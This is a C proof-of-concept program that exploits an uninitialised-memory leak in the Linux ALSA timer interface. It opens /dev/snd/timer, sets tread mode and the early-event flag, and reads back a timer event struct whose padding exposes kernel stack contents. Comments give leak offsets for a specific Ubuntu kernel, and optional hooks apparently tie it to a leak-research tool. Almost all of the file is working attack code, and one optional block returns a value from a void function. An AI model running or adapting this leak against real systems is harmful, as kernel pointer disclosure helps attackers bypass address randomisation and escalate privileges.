#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/syscall.h>
#include <asm/unistd_64.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sound/asound.h>

//#define TSF_TEST
#ifdef TSF_TEST
#include <tsf-lib.h>
#endif

#if 0
struct snd_timer_params {
    unsigned int flags;     /* flags - SNDRV_MIXER_PSFLG_* */
    unsigned int ticks;     /* requested resolution in ticks */
    unsigned int queue_size;    /* total size of queue (32-1024) */
    unsigned int reserved0;     /* reserved, was: failure locations */
    unsigned int filter;        /* event filter (bitmask of SNDRV_TIMER_EVENT_*) */
    unsigned char reserved[60]; /* reserved */
};

struct snd_timer_id {
    int dev_class;
    int dev_sclass;
    int card;
    int device;
    int subdevice;
};

struct snd_timer_select {
    struct snd_timer_id id; /* bind to timer ID */
    unsigned char reserved[32]; /* reserved */
};

struct snd_timer_tread {
    int event;
    struct timespec tstamp;
    unsigned int val;
};
#endif

// Ubuntu 4.4.0-21-generic
// Leak offset of event :  664
// Leak offset of val : 640

int fd;

void put_kptr(void)
{
#if 0
	char *data;
	data = mmap(NULL, 0xa000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
#else
	int fd;
	fd = shm_open("tsf_fuzz", O_CREAT | O_RDWR, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
	close(fd);
	shm_unlink("tsf_fuzz");
#endif
	return;
}

void leak(void)
{
	int cmd = SNDRV_TIMER_IOCTL_PARAMS;
	int tread = 1;
	struct snd_timer_params params;
	struct snd_timer_select tselect;
	struct snd_timer_tread ttread;
	int r;
	unsigned long leak_offset, stack_offset;
	unsigned int leak_value;

	memset(&params, 0, sizeof(params));
	memset(&tselect, 0, sizeof(tselect));
	memset(&ttread, 0, sizeof(ttread));

	// 1. Set tread as 1.
	r = ioctl(fd, SNDRV_TIMER_IOCTL_TREAD, &tread);
	if (r) {
		printf("SNDRV_TIMER_IOCTL_TREAD error : %d, %s\n", errno, strerror(errno));
		return;
	}

	// 2. Create timer instance
	tselect.id.dev_class = SNDRV_TIMER_CLASS_GLOBAL;
	tselect.id.dev_sclass = SNDRV_TIMER_SCLASS_APPLICATION;
	r = ioctl(fd, SNDRV_TIMER_IOCTL_SELECT, &tselect);
	if (r) {
		printf("SNDRV_TIMER_IOCTL_SELECT error : %d, %s\n", errno, strerror(errno));
		return;
	}

	// 3. Trigger copy leak value to kernel buffer.
	params.flags = SNDRV_TIMER_PSFLG_EARLY_EVENT;
	params.ticks = 1000 * 1000;

#ifdef TSF_TEST
	r = tsf_api_footprint_stack(&stack_offset);
	if (r) {
		printf("tsf_api_footprint_stack error\n");
		return r;
	}
#endif
	put_kptr();
	r = ioctl(fd, SNDRV_TIMER_IOCTL_PARAMS, &params);
	if (r) {
		printf("SNDRV_TIMER_IOCTL_PARAMS error : %d, %s\n", errno, strerror(errno));
		return;
	}

	// 4. Copy from kernel buffer to user buffer.
	r = read(fd, &ttread, sizeof(ttread));
	if (r <= 0) {
		printf("read error : %d, %s\n", errno, strerror(errno));
		return;
	}

#ifdef TSF_TEST
	leak_value = *((int *)&ttread.event + 1);
	leak_offset = tsf_api_get_leak_offset(4, (unsigned long)leak_value, stack_offset);
	printf("leak_offset(event) : %ld\n", leak_offset);

	leak_value = *((int *)&ttread.val + 1);
	leak_offset = tsf_api_get_leak_offset(4, (unsigned long)leak_value, stack_offset);
	printf("leak_offset(val) : %ld\n", leak_offset);
#endif

	// 5. Print result
	printf("sizeof(struct snd_timer_tread) : %d\n", sizeof(ttread));
	printf("event : %lx, val : %lx\n", *(unsigned long *)&ttread.event, *(unsigned long *)&ttread.val);
}

int main(int argc, char **argv)
{
	fd = open("/dev/snd/timer", O_RDWR);
	if (fd < 0) {
		printf("open error : %d, %s\n", errno, strerror(errno));
		return -1;
	}

	leak();
	close(fd);
	return 0;
}
